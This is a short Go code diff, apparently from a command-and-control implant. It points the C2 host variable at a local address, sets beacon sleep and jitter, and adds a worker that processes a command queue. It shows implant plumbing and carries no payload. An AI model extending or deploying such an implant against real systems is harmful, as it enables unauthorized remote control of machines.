@@ -9,7 +9,7 @@ import (
 )
 
 var (
-	C2Host string = ""
+	C2Host string = "http://127.0.0.1:8080"
 	Sleep  int    = 10
 	Jitter int    = 5
 	err    error
@@ -74,6 +74,13 @@ func main() {
 
 	// Start the beacon
 	instance.Beacon.Start()
+	wrker := internal.Worker{
+		Kill:     false,
+		HttpConn: instance.HttpConn,
+		ReqQueue: instance.Beacon.ReqQueue,
+		CmdQueue: instance.Beacon.CmdQueue,
+	}
+	wrker.Run()
 }
 
 func getId(instance *Instance) (*string, error) {
